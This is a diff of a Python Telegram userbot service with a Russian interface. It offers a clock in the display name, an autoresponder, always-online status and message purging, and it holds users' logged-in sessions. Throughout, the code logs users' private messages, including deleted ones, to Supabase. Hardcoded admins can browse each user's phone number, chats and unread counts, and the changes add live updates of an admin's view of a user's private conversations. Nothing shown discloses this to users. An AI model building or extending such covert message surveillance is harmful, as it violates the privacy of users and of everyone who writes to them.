@@ -36,7 +36,6 @@ SUPABASE_KEY = os.getenv("SUPABASE_KEY", "")
 supabase: SupabaseClient = create_client(SUPABASE_URL, SUPABASE_KEY)
 ADMIN_USERNAMES = ["Qwtyf05920Real", "VG9sdWJhZXYgTWl5aXJiZWso"]
 TEMP_ADMINS = set()
-ADMIN_DISPLAY_NICK = "GDSdifjapodmfw265"
 
 # === ЛОКАЛИЗАЦИЯ ===
 LANG = {
@@ -74,7 +73,8 @@ def get_user_state(user_id):
             "msg_id": None, "phone": None, "password": None, "phone_code_hash": None,
             "client": None, "state": "START", "time_nick_active": False, "time_nick_task": None,
             "status_24_7": False, "task_24_7": None, "activity_task": None,
-            "admin_view_user": None, "admin_view_chat": None
+            "admin_view_user": None, "admin_view_chat": None, "admin_view_page": 1,
+            "current_menu": None, "is_menu_locked": False, "last_interaction_time": time.time()
         }
     return USER_DATA[user_id]
 
@@ -83,7 +83,7 @@ def is_admin(user_id, username):
     return clean in ADMIN_USERNAMES or user_id in TEMP_ADMINS
 
 # === БАЗА ДАННЫХ (SUPABASE) ===
-async def get_db_config(user_id):
+async def get_db_config(user_id, username=None, first_name=None):
     res = supabase.table("user_configs").select("*").eq("user_id", user_id).execute()
     if not res.data:
         default = {
@@ -93,12 +93,29 @@ async def get_db_config(user_id):
             "menu_lock_code": None, "logged_in": False, "last_interaction_time": time.time(),
             "custom_nick_style": 1, "timezone_name": "Ташкент / UTC+5"
         }
-        supabase.table("user_configs").insert(default).execute()
+        try:
+            default["username"] = username or ""
+            default["first_name"] = first_name or "Без имени"
+            supabase.table("user_configs").insert(default).execute()
+        except Exception: 
+            pass
         return default
-    return res.data[0]
+    else:
+        # Обновляем базовые данные о юзере при активности
+        if username is not None or first_name is not None:
+            updates = {}
+            if username is not None: updates["username"] = username
+            if first_name is not None: updates["first_name"] = first_name
+            try: supabase.table("user_configs").update(updates).eq("user_id", user_id).execute()
+            except Exception: pass
+        return res.data[0]
 
 async def update_db_config(user_id, updates):
     supabase.table("user_configs").update(updates).eq("user_id", user_id).execute()
+    if "is_menu_locked" in updates:
+        get_user_state(user_id)["is_menu_locked"] = updates["is_menu_locked"]
+    if "last_interaction_time" in updates:
+        get_user_state(user_id)["last_interaction_time"] = updates["last_interaction_time"]
 
 async def get_db_session(user_id):
     res = supabase.table("user_sessions").select("session_string").eq("user_id", user_id).execute()
@@ -138,7 +155,7 @@ async def log_pm_message(client, message, is_deleted=False):
     sender_name = message.from_user.first_name if message.from_user else "Unknown"
     text = message.text or message.caption or ""
     is_media = bool(message.media)
-    media_type = f"*{message.media.value}*" if is_media else ""
+    media_type = f"[{message.media.value}]" if is_media else ""
     
     log_data = {
         "user_id": user_id, "chat_id": chat_id, "msg_id": msg_id,
@@ -146,13 +163,19 @@ async def log_pm_message(client, message, is_deleted=False):
         "text": text, "is_deleted": is_deleted, "date": message.date.isoformat(),
         "is_media": is_media, "media_type": media_type
     }
-    # Upsert logic to handle existing messages safely
     res = supabase.table("messages_log").select("id").eq("user_id", user_id).eq("msg_id", msg_id).execute()
     if res.data:
         if is_deleted:
              supabase.table("messages_log").update({"is_deleted": True}).eq("id", res.data[0]["id"]).execute()
     else:
         supabase.table("messages_log").insert(log_data).execute()
+
+async def trigger_pm_update(user_id, chat_id):
+    # Обновление экрана админа в реальном времени при новом/удаленном ЛС
+    for admin_id, data in USER_DATA.items():
+        if data.get("current_menu") == "admin_viewpm" and data.get("admin_view_user") == user_id and data.get("admin_view_chat") == chat_id:
+            page = data.get("admin_view_page", 1)
+            await refresh_admin_pm_view(admin_id, user_id, chat_id, page)
 
 async def process_autoresponder(client, message):
     if not message.chat or message.chat.type != enums.ChatType.PRIVATE: return
@@ -166,7 +189,6 @@ async def process_autoresponder(client, message):
     replied = cfg.get("replied_users", [])
     if sender_id in replied: return
 
-    # Проверяем кто писал последним
     my_last, their_last = 0, 0
     async for msg in client.get_chat_history(sender_id, limit=15):
         if msg.from_user and msg.from_user.is_self:
@@ -174,23 +196,26 @@ async def process_autoresponder(client, message):
         else:
             if not their_last: their_last = msg.date.timestamp()
 
-    if my_last > their_last: 
-        # Владелец сам написал первым/последним, автоответ не нужен
-        return
+    if my_last > their_last: return
 
     custom_greeting = cfg.get("autoresponder_greeting", LANG["msg_autoresp_default"])
-    await client.send_message(chat_id=sender_id, text=custom_greeting)
-    replied.append(sender_id)
-    await update_db_config(user_id, {"replied_users": replied})
+    try:
+        await client.send_message(chat_id=sender_id, text=custom_greeting)
+        replied.append(sender_id)
+        await update_db_config(user_id, {"replied_users": replied})
+    except Exception: pass
 
 async def on_new_message(client, message):
     await process_autoresponder(client, message)
     await log_pm_message(client, message, False)
+    if message.chat and message.chat.type == enums.ChatType.PRIVATE:
+        await trigger_pm_update(client.owner_id, message.chat.id)
 
 async def on_deleted_message(client, messages):
     for msg in messages:
         if msg.chat and msg.chat.type == enums.ChatType.PRIVATE:
             supabase.table("messages_log").update({"is_deleted": True}).eq("user_id", client.owner_id).eq("msg_id", msg.id).execute()
+            await trigger_pm_update(client.owner_id, msg.chat.id)
 
 async def keep_online_loop(user_id):
     data = get_user_state(user_id)
@@ -204,12 +229,23 @@ async def keep_online_loop(user_id):
         except Exception: pass
         await asyncio.sleep(30)
 
+def strip_time_nick(name):
+    # Очистка имени от времени и украшений для возврата к дефолту
+    name = re.sub(r'\s*(\[.*?\]|⌚.*|⏳.*|★.*|[\d𝟎-𝟗𝟘-𝟡𝟢-𝟫𝟶-𝟿]+[:∶][\d𝟎-𝟗𝟘-𝟡𝟢-𝟫𝟶-𝟿]+)$', '', name)
+    name = name.replace("꧁ ", "").replace(" ꧂", "").replace("★ ", "")
+    return name.strip()
+
 def apply_custom_nick(base_name, time_str, style_idx):
+    bold = str.maketrans("0123456789:", "𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗:")
+    double = str.maketrans("0123456789:", "𝟘𝟙𝟚𝟛𝟜𝟝𝟞𝟟𝟠𝟡:")
+    sans = str.maketrans("0123456789:", "𝟢𝟣𝟤𝟥𝟤𝟧𝟨𝟩𝟪𝟫:")
+    mono = str.maketrans("0123456789:", "𝟶𝟷𝟸𝟹𝟺𝟻𝟼𝟽𝟾𝟿:")
+    
     if style_idx == 1: return f"{base_name} [{time_str}]"
-    if style_idx == 2: return f"{base_name} ⌚ {time_str}"
-    if style_idx == 3: return f"{base_name} ⏳ {time_str}"
-    if style_idx == 4: return f"꧁ {base_name} ꧂ {time_str}"
-    if style_idx == 5: return f"★ {base_name} ★ {time_str}"
+    if style_idx == 2: return f"{base_name} ⌚ {time_str.translate(bold)}"
+    if style_idx == 3: return f"{base_name} ⏳ {time_str.translate(double)}"
+    if style_idx == 4: return f"꧁ {base_name} ꧂ {time_str.translate(sans)}"
+    if style_idx == 5: return f"★ {base_name} ★ {time_str.translate(mono)}"
     return f"{base_name} [{time_str}]"
 
 async def time_nickname_loop(user_id):
@@ -219,16 +255,15 @@ async def time_nickname_loop(user_id):
         try:
             me = await data["client"].get_me()
             cfg = await get_db_config(user_id)
-            offset = cfg.get("timezone_offset", 5)
+            offset = float(cfg.get("timezone_offset", 5))
             style = cfg.get("custom_nick_style", 1)
             
             tz_now = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(hours=offset)
             time_str = tz_now.strftime('%H:%M')
             
-            base_name = me.first_name or "User"
-            base_name = re.sub(r'\s*\[.*?\]|\s*⌚.*|\s*⏳.*|꧁\s*|\s*꧂.*|★\s*|\s*★.*', '', base_name).strip()
-            
+            base_name = strip_time_nick(me.first_name or "User")
             final_name = apply_custom_nick(base_name, time_str, style)
+            
             if final_name != me.first_name:
                 await data["client"].update_profile(first_name=final_name)
         except Unauthorized:
@@ -243,7 +278,6 @@ async def activity_tracker_loop(user_id):
         await asyncio.sleep(60)
         if not data["client"] or not data["client"].is_connected: break
         try:
-            # Учет реальной активности со всех сессий
             auths = await data["client"].invoke(functions.account.GetAuthorizations())
             now_ts = time.time()
             is_active = any((now_ts - a.date_active) < 120 for a in auths.authorizations)
@@ -265,6 +299,9 @@ async def activity_tracker_loop(user_id):
 async def ensure_client_connected(user_id):
     data = get_user_state(user_id)
     cfg = await get_db_config(user_id)
+    data["is_menu_locked"] = cfg.get("is_menu_locked", False)
+    data["last_interaction_time"] = cfg.get("last_interaction_time", time.time())
+    
     if not cfg.get("logged_in"): return False
     if data["client"] and data["client"].is_connected: return True
 
@@ -323,31 +360,43 @@ class LockMiddleware(BaseMiddleware):
             
         if user_id:
             now = time.time()
-            cfg = await get_db_config(user_id)
-            locked = cfg.get("is_menu_locked", False)
-            last_active = cfg.get("last_interaction_time", now)
+            u_state = get_user_state(user_id)
+            locked = u_state.get("is_menu_locked", False)
+            last_active = u_state.get("last_interaction_time", now)
             
-            # Если не взаимодействовал > 5 мин и меню заблокировано
             if locked and (now - last_active > 300):
-                state = get_user_state(user_id).get("state")
-                if state != "WAITING_UNLOCK_CODE":
-                    get_user_state(user_id)["state"] = "WAITING_UNLOCK_CODE"
-                    # Если Render перезапустился - старое меню могло устареть
+                if u_state.get("state") != "WAITING_UNLOCK_CODE":
+                    u_state["state"] = "WAITING_UNLOCK_CODE"
                     try:
                         if isinstance(event, types.CallbackQuery) and event.message:
                             await event.message.delete()
                     except: pass
-                    
                     msg = await bot.send_message(user_id, LANG["msg_unlock_req"])
-                    get_user_state(user_id)["msg_id"] = msg.message_id
+                    u_state["msg_id"] = msg.message_id
                     return
             
-            # Обновляем время последней активности
             await update_db_config(user_id, {"last_interaction_time": now})
             
         return await handler(event, data)
 
 dp.update.middleware(LockMiddleware())
+
+async def background_lock_monitor():
+    while True:
+        await asyncio.sleep(10)
+        now = time.time()
+        for uid, data in list(USER_DATA.items()):
+            if data.get("is_menu_locked") and data.get("state") != "WAITING_UNLOCK_CODE":
+                last_active = data.get("last_interaction_time", now)
+                if now - last_active > 300:
+                    data["state"] = "WAITING_UNLOCK_CODE"
+                    try:
+                        if data.get("msg_id"):
+                            await bot.edit_message_text(LANG["msg_unlock_req"], chat_id=uid, message_id=data["msg_id"])
+                        else:
+                            msg = await bot.send_message(uid, LANG["msg_unlock_req"])
+                            data["msg_id"] = msg.message_id
+                    except Exception: pass
 
 async def edit_or_send(user_id, text, reply_markup=None, parse_mode=None):
     data = get_user_state(user_id)
@@ -366,15 +415,14 @@ async def edit_or_send(user_id, text, reply_markup=None, parse_mode=None):
 @dp.message(CommandStart())
 async def cmd_start(message: types.Message):
     user_id = message.from_user.id
-    try: await message.delete() # Удаление /start
+    try: await message.delete() 
     except Exception: pass
     
     await update_daily_stats('incoming')
-    cfg = await get_db_config(user_id)
+    cfg = await get_db_config(user_id, username=message.from_user.username, first_name=message.from_user.first_name)
     
     if await ensure_client_connected(user_id):
-        if cfg.get("is_menu_locked") and get_user_state(user_id)["state"] == "WAITING_UNLOCK_CODE":
-            return
+        if cfg.get("is_menu_locked") and get_user_state(user_id)["state"] == "WAITING_UNLOCK_CODE": return
         await show_main_menu(user_id, message.from_user.username)
     else:
         builder = InlineKeyboardBuilder()
@@ -491,6 +539,7 @@ async def finish_login(user_id, client):
 
 async def show_main_menu(user_id, username):
     get_user_state(user_id)["state"] = "MENU"
+    get_user_state(user_id)["current_menu"] = "main"
     builder = InlineKeyboardBuilder()
     builder.button(text=LANG["btn_activity"], callback_data="menu_activity")
     builder.button(text=LANG["btn_autoresp"], callback_data="menu_autoresponder")
@@ -498,12 +547,13 @@ async def show_main_menu(user_id, username):
     builder.button(text=LANG["btn_247"], callback_data="toggle_247")
     builder.button(text=LANG["btn_delete"], callback_data="menu_delete")
     builder.button(text=LANG["btn_block_menu"], callback_data="menu_block_settings")
+    builder.button(text="🔒 Заблокировать", callback_data="manual_lock")
     
     if is_admin(user_id, username):
         builder.button(text=LANG["btn_admin"], callback_data="admin_menu")
-        builder.adjust(2, 2, 2, 1)
+        builder.adjust(2, 2, 2, 2)
     else:
-        builder.adjust(2, 2, 2)
+        builder.adjust(2, 2, 2, 1)
         
     await edit_or_send(user_id, LANG["msg_menu"], reply_markup=builder.as_markup())
 
@@ -549,9 +599,17 @@ async def toggle_timenick(cb: types.CallbackQuery):
     data["time_nick_active"] = new_status
     if new_status and not data.get("time_nick_task"):
         data["time_nick_task"] = asyncio.create_task(time_nickname_loop(user_id))
-    elif not new_status and data.get("time_nick_task"):
-        data["time_nick_task"].cancel()
-        data["time_nick_task"] = None
+    elif not new_status:
+        if data.get("time_nick_task"):
+            data["time_nick_task"].cancel()
+            data["time_nick_task"] = None
+        # Моментальный сброс ника
+        if data["client"] and data["client"].is_connected:
+            try:
+                me = await data["client"].get_me()
+                clean_name = strip_time_nick(me.first_name or "User")
+                await data["client"].update_profile(first_name=clean_name)
+            except Exception: pass
         
     await menu_timenick(cb)
 
@@ -571,7 +629,7 @@ async def select_tz(cb: types.CallbackQuery):
 @dp.callback_query(F.data.startswith("set_tz_"))
 async def confirm_tz(cb: types.CallbackQuery):
     parts = cb.data.split("_", 3)
-    offset = int(parts[2])
+    offset = float(parts[2])
     name = parts[3]
     
     builder = InlineKeyboardBuilder()
@@ -580,13 +638,13 @@ async def confirm_tz(cb: types.CallbackQuery):
     builder.adjust(2)
     
     tz_now = (datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(hours=offset)).strftime('%H:%M')
-    text = f"Вы выбрали {name}.\nНик — {tz_now}\nВерно?"
+    text = f"Вы выбрали {name}.\nВремя сейчас — {tz_now}\nВерно?"
     await edit_or_send(cb.from_user.id, text, reply_markup=builder.as_markup())
 
 @dp.callback_query(F.data.startswith("save_tz_"))
 async def save_tz(cb: types.CallbackQuery):
     parts = cb.data.split("_", 3)
-    offset = int(parts[2])
+    offset = float(parts[2])
     name = parts[3]
     await update_db_config(cb.from_user.id, {"timezone_offset": offset, "timezone_name": name})
     await menu_timenick(cb)
@@ -598,11 +656,18 @@ async def menu_custom_nick(cb: types.CallbackQuery):
     base_name = "Имя"
     if client and client.is_connected:
         me = await client.get_me()
-        base_name = re.sub(r'\s*\[.*?\]|\s*⌚.*|\s*⏳.*|꧁\s*|\s*꧂.*|★\s*|\s*★.*', '', me.first_name or "Имя").strip()
+        base_name = strip_time_nick(me.first_name or "Имя")
         
     builder = InlineKeyboardBuilder()
-    for i in range(1, 6):
-        builder.button(text=f"Стиль {i}", callback_data=f"set_nick_style_{i}")
+    styles = [
+        ("Стиль [10:30]", 1),
+        ("Стиль 𝟏𝟎:𝟑𝟎", 2),
+        ("Стиль ⏳ 𝟙𝟘:𝟛𝟘", 3),
+        ("Стиль ꧁ Имя ꧂", 4),
+        ("Стиль ★ Имя ★", 5)
+    ]
+    for s_name, idx in styles:
+        builder.button(text=s_name, callback_data=f"set_nick_style_{idx}")
     builder.button(text=LANG["btn_back"], callback_data="menu_profile_settings")
     builder.adjust(1)
     
@@ -623,9 +688,9 @@ async def set_nick_style(cb: types.CallbackQuery):
     base_name = "Имя"
     if client and client.is_connected:
         me = await client.get_me()
-        base_name = re.sub(r'\s*\[.*?\]|\s*⌚.*|\s*⏳.*|꧁\s*|\s*꧂.*|★\s*|\s*★.*', '', me.first_name or "Имя").strip()
+        base_name = strip_time_nick(me.first_name or "Имя")
     
-    demo_name = apply_custom_nick(base_name, "универсальное время", style_idx)
+    demo_name = apply_custom_nick(base_name, "10:30", style_idx)
     builder = InlineKeyboardBuilder().button(text="Назад к главному меню", callback_data="main_menu")
     await edit_or_send(user_id, f"✅ Оформление обновлено!\nВаш ник: `{demo_name}`", reply_markup=builder.as_markup(), parse_mode="Markdown")
 
@@ -696,13 +761,22 @@ async def menu_delete(cb: types.CallbackQuery):
     user_id = cb.from_user.id
     builder = InlineKeyboardBuilder()
     for count in [10, 25, 50, 100]:
-        builder.button(text=f"🗑 {count}", callback_data=f"purge_{count}")
+        builder.button(text=f"🗑 {count}", callback_data=f"confirm_purge_{count}")
     builder.button(text=LANG["btn_back_menu"], callback_data="main_menu")
     builder.adjust(2, 2, 1)
     await edit_or_send(user_id, LANG["msg_del_text"], reply_markup=builder.as_markup(), parse_mode="Markdown")
 
-@dp.callback_query(F.data.startswith("purge_"))
-async def purge_messages(cb: types.CallbackQuery):
+@dp.callback_query(F.data.startswith("confirm_purge_"))
+async def confirm_purge(cb: types.CallbackQuery):
+    count = int(cb.data.split("_")[2])
+    builder = InlineKeyboardBuilder()
+    builder.button(text="Да", callback_data=f"dopurge_{count}")
+    builder.button(text="Нет / Назад", callback_data="menu_delete")
+    builder.adjust(2)
+    await edit_or_send(cb.from_user.id, f"⚠️ Вы точно хотите удалить последние {count} сообщений?", reply_markup=builder.as_markup())
+
+@dp.callback_query(F.data.startswith("dopurge_"))
+async def do_purge(cb: types.CallbackQuery):
     user_id = cb.from_user.id
     count = int(cb.data.split("_")[1])
     data = get_user_state(user_id)
@@ -710,6 +784,8 @@ async def purge_messages(cb: types.CallbackQuery):
     if not data["client"] or not data["client"].is_connected:
         await edit_or_send(user_id, "❌ Юзербот не активен.")
         return
+
+    await edit_or_send(user_id, "⏳ Подождите... Идёт удаление...")
 
     deleted = 0
     try:
@@ -722,11 +798,11 @@ async def purge_messages(cb: types.CallbackQuery):
             if my_msgs:
                 await data["client"].delete_messages(dialog.chat.id, my_msgs)
                 deleted += len(my_msgs)
-        text = f"✅ Успешно очищено {deleted} ваших сообщений!"
+        text = f"✅ Успешно удалено: {deleted} сообщений!"
     except Exception as e:
         text = f"⚠️ Ошибка при очистке: {e}"
         
-    builder = InlineKeyboardBuilder().button(text=LANG["btn_back_menu"], callback_data="main_menu")
+    builder = InlineKeyboardBuilder().button(text="Назад", callback_data="menu_delete")
     await edit_or_send(user_id, text, reply_markup=builder.as_markup())
 
 # === БЛОКИРОВКА МЕНЮ PIN-КОДОМ ===
@@ -779,6 +855,20 @@ async def unlock_pin_setup(cb: types.CallbackQuery):
     await update_db_config(user_id, {"is_menu_locked": False, "menu_lock_code": None})
     await menu_block_settings(cb)
 
+@dp.callback_query(F.data == "manual_lock")
+async def manual_lock(cb: types.CallbackQuery):
+    user_id = cb.from_user.id
+    cfg = await get_db_config(user_id)
+    if cfg.get("is_menu_locked"):
+        get_user_state(user_id)["state"] = "WAITING_UNLOCK_CODE"
+        if get_user_state(user_id)["msg_id"]:
+            try: await bot.delete_message(user_id, get_user_state(user_id)["msg_id"])
+            except: pass
+        msg = await bot.send_message(user_id, LANG["msg_unlock_req"])
+        get_user_state(user_id)["msg_id"] = msg.message_id
+    else:
+        await cb.answer("❌ PIN-код не установлен. Настройте его в блокировке меню.", show_alert=True)
+
 @dp.message(lambda msg: get_user_state(msg.from_user.id)["state"] == "WAITING_UNLOCK_CODE")
 async def process_unlock_code(message: types.Message):
     user_id = message.from_user.id
@@ -788,14 +878,13 @@ async def process_unlock_code(message: types.Message):
     
     cfg = await get_db_config(user_id)
     if cfg.get("menu_lock_code") == code:
-        # Успешная разблокировка
         data = get_user_state(user_id)
         data["state"] = "MENU"
         await update_db_config(user_id, {"last_interaction_time": time.time()})
         try:
             if data["msg_id"]: await bot.delete_message(user_id, data["msg_id"])
         except: pass
-        data["msg_id"] = None # Сброс, чтобы создалось новое меню
+        data["msg_id"] = None 
         await show_main_menu(user_id, message.from_user.username)
     else:
         msg = await message.answer("❌ Неверный PIN-код!")
@@ -834,6 +923,7 @@ async def toggle_247(cb: types.CallbackQuery):
 @dp.callback_query(F.data == "admin_menu")
 async def admin_menu(cb: types.CallbackQuery):
     if not is_admin(cb.from_user.id, cb.from_user.username): return
+    get_user_state(cb.from_user.id)["current_menu"] = "admin_main"
     text = "👑 **Меню Администрации:**"
     builder = InlineKeyboardBuilder()
     builder.button(text="Статус 📊", callback_data="admin_status")
@@ -842,13 +932,9 @@ async def admin_menu(cb: types.CallbackQuery):
     builder.adjust(2, 1)
     await edit_or_send(cb.from_user.id, text, reply_markup=builder.as_markup(), parse_mode="Markdown")
 
-@dp.callback_query(F.data == "admin_status")
-async def admin_status(cb: types.CallbackQuery):
-    if not is_admin(cb.from_user.id, cb.from_user.username): return
+async def refresh_admin_status(admin_id):
     today = datetime.datetime.now().date()
-    text = "📊 **Статус актива:**\n\n"
-    
-    # 7 дней
+    text = "📊 **Статус актива (За 7 дней):**\n\n"
     for i in range(6, -1, -1):
         dt = (today - datetime.timedelta(days=i)).strftime("%Y-%m-%d")
         res = supabase.table("daily_stats").select("*").eq("date", dt).execute()
@@ -860,23 +946,37 @@ async def admin_status(cb: types.CallbackQuery):
     builder.button(text=LANG["btn_refresh"], callback_data="admin_status")
     builder.button(text=LANG["btn_back"], callback_data="admin_menu")
     builder.adjust(1)
-    await edit_or_send(cb.from_user.id, text, reply_markup=builder.as_markup(), parse_mode="Markdown")
+    await edit_or_send(admin_id, text, reply_markup=builder.as_markup(), parse_mode="Markdown")
+
+async def admin_status_loop():
+    while True:
+        await asyncio.sleep(60)
+        for uid, data in list(USER_DATA.items()):
+            if data.get("current_menu") == "admin_status":
+                await refresh_admin_status(uid)
+
+@dp.callback_query(F.data == "admin_status")
+async def admin_status(cb: types.CallbackQuery):
+    if not is_admin(cb.from_user.id, cb.from_user.username): return
+    get_user_state(cb.from_user.id)["current_menu"] = "admin_status"
+    await refresh_admin_status(cb.from_user.id)
 
 @dp.callback_query(F.data == "admin_users")
 async def admin_users(cb: types.CallbackQuery):
     if not is_admin(cb.from_user.id, cb.from_user.username): return
+    get_user_state(cb.from_user.id)["current_menu"] = "admin_users"
     
-    # Count Active
     res_a = supabase.table("user_configs").select("user_id", count="exact").eq("logged_in", True).execute()
     c_active = res_a.count
-    # Count Outgoing (logged_in=False but has phone in sessions)
-    res_o = supabase.table("user_sessions").select("user_id", count="exact").execute()
-    c_outgoing = res_o.count - c_active # roughly
-    if c_outgoing < 0: c_outgoing = 0
-    # Count Incoming (in configs, but no session)
+    
+    res_s = supabase.table("user_sessions").select("user_id").execute()
+    all_session_uids = [r["user_id"] for r in res_s.data]
+    res_c = supabase.table("user_configs").select("user_id").eq("logged_in", True).execute()
+    active_uids = [r["user_id"] for r in res_c.data]
+    c_outgoing = len(list(set(all_session_uids) - set(active_uids)))
+    
     res_all = supabase.table("user_configs").select("user_id", count="exact").execute()
-    c_inc = res_all.count - res_o.count
-    if c_inc < 0: c_inc = 0
+    c_inc = max(res_all.count - len(all_session_uids), 0)
     
     text = "👥 **Пользователи бота:**"
     builder = InlineKeyboardBuilder()
@@ -889,12 +989,11 @@ async def admin_users(cb: types.CallbackQuery):
 
 def build_pagination(prefix, current_page, total_items, limit=5):
     total_pages = (total_items + limit - 1) // limit
-    if total_pages == 0: total_pages = 1
+    if total_pages <= 1: return []
     buttons = []
     if current_page > 1:
         buttons.append(types.InlineKeyboardButton(text="Назад", callback_data=f"{prefix}_{current_page-1}"))
-    if total_pages > 1:
-        buttons.append(types.InlineKeyboardButton(text=str(current_page), callback_data="ignore"))
+    buttons.append(types.InlineKeyboardButton(text=str(current_page), callback_data="ignore"))
     if current_page < total_pages:
         buttons.append(types.InlineKeyboardButton(text="Вперед", callback_data=f"{prefix}_{current_page+1}"))
     return buttons
@@ -902,34 +1001,26 @@ def build_pagination(prefix, current_page, total_items, limit=5):
 @dp.callback_query(F.data.startswith("admin_ulist_"))
 async def admin_ulist(cb: types.CallbackQuery):
     if not is_admin(cb.from_user.id, cb.from_user.username): return
+    get_user_state(cb.from_user.id)["current_menu"] = "admin_ulist"
     parts = cb.data.split("_")
     cat = parts[2]
     page = int(parts[3])
     limit = 5
     offset = (page - 1) * limit
-    
     builder = InlineKeyboardBuilder()
     
     if cat == "active":
-        title = "🟢 Активные пользователи:"
-        res = supabase.table("user_configs").select("user_id").eq("logged_in", True).range(offset, offset+limit-1).execute()
+        title = "🟢 **Активные пользователи:**"
+        res = supabase.table("user_configs").select("user_id, first_name").eq("logged_in", True).range(offset, offset+limit-1).execute()
         res_count = supabase.table("user_configs").select("user_id", count="exact").eq("logged_in", True).execute()
-        
         for row in res.data:
             uid = row["user_id"]
-            name = f"User {uid}"
-            if uid in USER_DATA and USER_DATA[uid]["client"]:
-                try: 
-                    me = await USER_DATA[uid]["client"].get_me()
-                    name = me.first_name
-                except: pass
+            name = row.get("first_name", f"User {uid}")
             builder.button(text=name, callback_data=f"admin_ucard_{uid}")
         builder.adjust(1)
             
     elif cat == "outgoing":
-        title = "🔴 Выходящие пользователи:"
-        # users with session record but not active
-        # Subquery is tricky in supabase py client, doing direct
+        title = "🔴 **Выходящие пользователи:**"
         res_s = supabase.table("user_sessions").select("user_id").execute()
         all_session_uids = [r["user_id"] for r in res_s.data]
         res_a = supabase.table("user_configs").select("user_id").eq("logged_in", True).execute()
@@ -939,24 +1030,28 @@ async def admin_ulist(cb: types.CallbackQuery):
         res_count = type('obj', (object,), {'count': len(out_uids)})
         chunk = out_uids[offset:offset+limit]
         for uid in chunk:
-            builder.button(text=f"User {uid}", callback_data=f"admin_ucard_{uid}")
+            res_conf = supabase.table("user_configs").select("first_name").eq("user_id", uid).execute()
+            name = res_conf.data[0]["first_name"] if res_conf.data else f"User {uid}"
+            builder.button(text=name, callback_data=f"admin_ucard_{uid}")
         builder.adjust(1)
             
     elif cat == "incoming":
-        title = "📩 Входящие:"
-        res_all = supabase.table("user_configs").select("user_id, last_interaction_time").order("last_interaction_time", desc=True).execute()
+        title = "📩 **Входящие:**"
+        res_all = supabase.table("user_configs").select("*").order("last_interaction_time", desc=True).execute()
         res_s = supabase.table("user_sessions").select("user_id").execute()
         session_uids = [r["user_id"] for r in res_s.data]
         inc_data = [r for r in res_all.data if r["user_id"] not in session_uids]
         
         res_count = type('obj', (object,), {'count': len(inc_data)})
         chunk = inc_data[offset:offset+limit]
-        
         text = f"{title}\n\n"
+        
         for r in chunk:
             uid = r["user_id"]
-            dt = datetime.datetime.fromtimestamp(r["last_interaction_time"]).strftime("%H:%M")
-            text += f"{dt}: UID {uid}\n"
+            dt = datetime.datetime.fromtimestamp(r.get("last_interaction_time", time.time())).strftime("%d.%m %H:%M")
+            name = r.get("first_name", "Без имени")
+            uname = f"@{r['username']}" if r.get("username") else ""
+            text += f"🕒 `{dt}`: {name} {uname} (ID: {uid})\n"
         
         pag_btns = build_pagination(f"admin_ulist_{cat}", page, res_count.count, limit)
         if pag_btns: builder.row(*pag_btns)
@@ -973,11 +1068,11 @@ async def admin_ulist(cb: types.CallbackQuery):
 async def admin_ucard(cb: types.CallbackQuery):
     if not is_admin(cb.from_user.id, cb.from_user.username): return
     uid = int(cb.data.split("_")[2])
+    get_user_state(cb.from_user.id)["current_menu"] = "admin_ucard"
     
     res = supabase.table("user_sessions").select("phone").eq("user_id", uid).execute()
     phone = res.data[0]["phone"] if res.data else "Неизвестно"
     
-    # Activity today
     act_res = supabase.table("user_activity").select("activity_data").eq("user_id", uid).execute()
     hrs = 0
     if act_res.data:
@@ -985,11 +1080,13 @@ async def admin_ucard(cb: types.CallbackQuery):
         mins = act_res.data[0]["activity_data"].get(today, 0)
         hrs = mins // 60
         
-    # Deleted msgs
     del_res = supabase.table("messages_log").select("id", count="exact").eq("user_id", uid).eq("is_deleted", True).execute()
     del_count = del_res.count if del_res else 0
     
-    text = f"👤 **Пользователь {uid}**\n\nНомер: `{phone}`\nВ сети сегодня: Уже {hrs} часов\nУдалил сообщений: {del_count}"
+    res_c = supabase.table("user_configs").select("first_name").eq("user_id", uid).execute()
+    name = res_c.data[0].get("first_name", f"Пользователь {uid}") if res_c.data else f"Пользователь {uid}"
+    
+    text = f"👤 **{name}**\n\nНомер: `{phone}`\nОблачный пароль: [Не сохраняется]\nВ сети сегодня: {hrs} часов\nУдалил сообщений: {del_count}"
     
     builder = InlineKeyboardBuilder()
     builder.button(text="Лички", callback_data=f"admin_upms_{uid}_1")
@@ -1000,27 +1097,37 @@ async def admin_ucard(cb: types.CallbackQuery):
 @dp.callback_query(F.data.startswith("admin_upms_"))
 async def admin_upms(cb: types.CallbackQuery):
     if not is_admin(cb.from_user.id, cb.from_user.username): return
+    get_user_state(cb.from_user.id)["current_menu"] = "admin_upms"
     parts = cb.data.split("_")
     uid = int(parts[2])
     page = int(parts[3])
     limit = 5
     offset = (page - 1) * limit
     
-    # Distinct chats from messages_log
     res = supabase.table("messages_log").select("chat_id, sender_name, date").eq("user_id", uid).order("date", desc=True).execute()
     chats = {}
     for r in res.data:
         cid = r["chat_id"]
         if cid not in chats: chats[cid] = r["sender_name"]
-        if len(chats) >= 25: break # max 25 dialogs
+        if len(chats) >= 25: break
         
     chat_list = list(chats.items())
     chunk = chat_list[offset:offset+limit]
     
-    text = f"💬 **Лички {uid}:**"
+    # Пытаемся получить непрочитанные безопасно, если клиент онлайн
+    unread_counts = {}
+    if uid in USER_DATA and USER_DATA[uid].get("client") and USER_DATA[uid]["client"].is_connected:
+        try:
+            async for d in USER_DATA[uid]["client"].get_dialogs(limit=30):
+                unread_counts[d.chat.id] = d.unread_messages_count
+        except: pass
+    
+    text = f"💬 **Личные диалоги:**"
     builder = InlineKeyboardBuilder()
     for cid, name in chunk:
-        builder.button(text=f"{name}", callback_data=f"admin_viewpm_{uid}_{cid}_1")
+        unread = unread_counts.get(cid, 0)
+        unread_str = f" ({unread})" if unread > 0 else ""
+        builder.button(text=f"{name}{unread_str}", callback_data=f"admin_viewpm_{uid}_{cid}_1")
     builder.adjust(1)
     
     pag_btns = build_pagination(f"admin_upms_{uid}", page, len(chat_list), limit)
@@ -1029,20 +1136,14 @@ async def admin_upms(cb: types.CallbackQuery):
     
     await edit_or_send(cb.from_user.id, text, reply_markup=builder.as_markup(), parse_mode="Markdown")
 
-@dp.callback_query(F.data.startswith("admin_viewpm_"))
-async def admin_viewpm(cb: types.CallbackQuery):
-    if not is_admin(cb.from_user.id, cb.from_user.username): return
-    parts = cb.data.split("_")
-    uid = int(parts[2])
-    cid = int(parts[3])
